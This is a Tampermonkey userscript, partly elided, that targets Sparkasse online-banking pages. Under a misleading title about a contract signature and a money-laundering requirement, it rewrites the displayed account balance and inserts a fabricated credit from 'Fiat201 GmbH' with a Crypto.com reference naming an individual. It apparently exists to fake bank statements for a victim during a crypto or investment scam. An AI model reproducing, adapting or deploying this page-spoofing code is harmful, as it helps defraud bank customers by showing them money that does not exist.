// ==UserScript==
// @name         Vertragssignature Schaudt
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Anforderung an GwG um Auszahlungen ueber 10.000 EURO auszufuehren.
// @author       You
// @license MIT
...
// @match        https://www.sparkasse-offenburg.de/de/home/onlinebanking/finanzstatus.html*
// @match        https://www.sparkasse-offenburg.de/de/home/onlinebanking/umsaetze/umsaetze.html*
// @match        https://www.taunussparkasse.de/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/450568/Vertragssignature%20Schaudt.user.js
// @updateURL https://update.greasyfork.org/scripts/450568/Vertragssignature%20Schaudt.meta.js
// ==/UserScript==
...
(function() {
    ...
    var vorgemerkt = "no";
    var kontoteil = "1";
    var absender = "Fiat201 GmbH";
    var asenderReference = "WD3746 TRX88000 Schaudt, Wolfgang - Crypto.com";
    var absenderDetails = "01.09.2022 | ECHT. GUTSCHR. TREUHAND";
...
var actualbalance = document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].children[1].children[0].textContent;
...
document.getElementsByTagName("tbody")[tabelle].children[0].children[1].children[0].children[0].children[1].children[0].textContent = our2;
    ...
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.children[1].children[0].children[1].textContent = newSaldoDec;
